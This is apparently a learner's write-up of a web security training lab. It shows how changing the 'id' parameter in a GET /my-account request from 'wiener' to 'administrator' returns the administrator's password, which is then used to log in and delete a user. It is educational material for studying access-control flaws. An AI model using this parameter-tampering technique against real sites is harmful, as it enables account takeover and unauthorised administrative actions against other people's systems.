There are some cases when a horizontal privilege escalation can be turned into a vertical privilege escalation. This by compromising a more privileged user.

For example, where a horizontal escalation allows the attacker to reset or capture the password which belongs to another user, and if the target i an administrative user, they can gain administrative access.

## 4.1 Lab - User ID Controlled by Request Parameter with Password Disclosure

The lab has user account page which contains the current user's password, prefilled in a masked input.

The goal of the lab is to retrieve the administrator's password and then delete the user `carlos`.

In the lab can be logged in using the credentials: `wiener:peter`.

When i log in with the `wiener` account, I see a field with the Password in Asterix and a button to update it.

After checking the response to this page, I see:

```html
                       <form class="login-form" action="/my-account/change-password" method="POST">
                            <br/>
                            <label>Password</label>
                            <input required type="hidden" name="csrf" value="wOYK6TGeT4EzqY1YHn6fpV4GVqXLK3UC">
                            <input required type=password name=password value='peter'/>
                            <button class='button' type='submit'> Update password </button>
                        </form>
```

And the request to which I got this response is: `GET /my-account?id=wiener HTTP/2`.

Let's try to change this to `id=administrator`.
 
I received the response with `200 OK` and in the body I can see the `administrator` password:

```html
                       <form class="login-form" action="/my-account/change-password" method="POST">
                            <br/>
                            <label>Password</label>
                            <input required type="hidden" name="csrf" value="wOYK6TGeT4EzqY1YHn6fpV4GVqXLK3UC">
                            <input required type=password name=password value='ffuu7p5xqgudwfxhdpwa'/>
                            <button class='button' type='submit'> Update password </button>
                        </form>
```

I use that to login and delete the user `carlos`.

------

